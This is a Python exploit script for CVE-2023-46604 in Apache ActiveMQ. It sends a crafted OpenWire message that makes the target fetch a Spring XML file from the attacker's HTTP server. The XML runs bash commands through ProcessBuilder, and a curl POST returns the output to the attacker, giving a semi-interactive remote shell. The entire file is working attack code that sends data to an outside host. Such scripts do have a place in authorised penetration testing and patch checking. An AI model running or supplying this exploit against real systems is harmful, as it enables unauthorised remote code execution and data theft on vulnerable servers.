import socket
import argparse
from http.server import BaseHTTPRequestHandler, HTTPServer
from xml.etree.ElementTree import Element, SubElement, tostring
import threading
from time import sleep


def main(ip, port, srvip, srvport):
    url = "http://" + srvip + ":" + str(srvport) + "/poc.xml"
    
    print("#################################################################################")
    print("#  CVE-2023-46604 - Apache ActiveMQ - Remote Code Execution - Pseudo Shell      #")
    print("#  Exploit by Ducksec, Original POC by X1r0z, Python POC by evkl1d              #")
    print("#################################################################################")
    print()
    
    print("[*] Target:", f"{ip}:{port}")
    print("[*] Serving XML at:", url)
    print("[!] This is a semi-interactive pseudo-shell, you cannot cd, but you can ls-lah / for example.")
    print("[*] Type 'exit' to quit")
    print()
    
    global connected
    connected = False
    if not connected:
        print("#################################################################################")
        print("# Not yet connected, send a command to test connection to host.                 #")
        print("# Prompt will change to Apache ActiveMQ$ once at least one response is received #")
        print("# Please note this is a one-off connection check, re-run the script if you      #")
        print("# want to re-check the connection.                                              #")
        print("#################################################################################")
        print()
    else:
        pass
    
    while True:
        prompt = "[Target not responding!]$ " if not connected else "Apache ActiveMQ$ "
        command = input(prompt)
        if command.lower() == 'exit':
            print("Exiting...")
            return
        
        if not command:
            print("Please enter a valid command.")
            continue
        else:
            execute(ip, port, srvip, srvport, command, url)


def execute(ip, port, srvip, srvport, command, url):
    class_name = "org.springframework.context.support.ClassPathXmlApplicationContext"
    message = url
    header = "1f00000000000000000001"
    body = header + "01" + int2hex(len(class_name), 4) + string2hex(class_name) + "01" + int2hex(len(message), 4) + string2hex(message)
    payload = int2hex(len(body) // 2, 8) + body
    data = bytes.fromhex(payload)
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.connect((ip, port))
    conn.send(data)
    conn.close()
    
    command = command
    generate_xml(command, srvip, srvport)
    serve_xml_content(srvip, srvport)
    return


def generate_xml(command, srvip, srvport): 
    root = Element('beans', attrib={
        'xmlns': 'http://www.springframework.org/schema/beans',
        'xmlns:xsi': 'http://www.w3.org/2001/XMLSchema-instance',
        'xsi:schemaLocation': 'http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd'
    })

    bean = SubElement(root, 'bean', attrib={'id': 'pb', 'class': 'java.lang.ProcessBuilder', 'init-method': 'start'})
    constructor_arg = SubElement(bean, 'constructor-arg')
    l = SubElement(constructor_arg, 'list')
    full_command = command + """ | awk '{print $0";"}' | curl -X POST -d @- http://""" + srvip + ":" + str(srvport) + "/receive_data" #use ; as a separator for later
    values = ['bash', '-c', full_command]
    
    for value in values:
        SubElement(l, 'value').text = value
        
    xml_string = '<?xml version="1.0" encoding="UTF-8" ?>\n' + tostring(root).decode()
    with open('poc.xml', 'w') as file:
        file.write(xml_string)
    
    return xml_string


run = True


class CustomHTTPServer(HTTPServer):
    def handle_timeout(self):
        if not run:
            self.shutdown()


class XMLServer(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass  # Override log_message to do nothing
    
    def do_GET(self):
        if self.path == '/poc.xml':
            with open('poc.xml', 'rb') as file:
                self.send_response(200)
                self.send_header('Content-type', 'text/xml')
                self.end_headers()
                self.wfile.write(file.read())  # serve poc.xml
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'404 - Not Found')
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode()
        
        response_data = post_data.split(';') # use the ; to reconstruct line breaks
        
        for line in response_data:
            print(line)
        
        self.send_response(200)
        self.end_headers()
        global connected
        connected = True
        global run_server
        run_server = False


def serve_xml_content(srvip, srvport):
    server_address = (srvip, srvport)
    httpd = HTTPServer(server_address, XMLServer)
    
    httpd.timeout = 1  # Set the server timeout
    
    global run_server
    run_server = True
    
    while run_server:
        httpd.handle_request()
    
    httpd.server_close()  # Close the server socket
    
    return


def string2hex(s):
    return s.encode().hex()


def int2hex(i, n):
    if n == 4:
        return format(i, '04x')
    elif n == 8:
        return format(i, '08x')
    else:
        raise ValueError("n must be 4 or 8")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--ip", help="ActiveMQ Server IP or Hostname", required=True)
    parser.add_argument("-p", "--port", type=int, default="61616", help="ActiveMQ Server Port, defaults to 61616", required=False)
    parser.add_argument("-si", "--srvip",  help="Serve IP", required=True)
    parser.add_argument("-sp", "--srvport", type=int, default=8080, help="Serve port, defaults to 8080", required=False)
    args = parser.parse_args()
    
    main(args.ip, args.port, args.srvip, args.srvport)
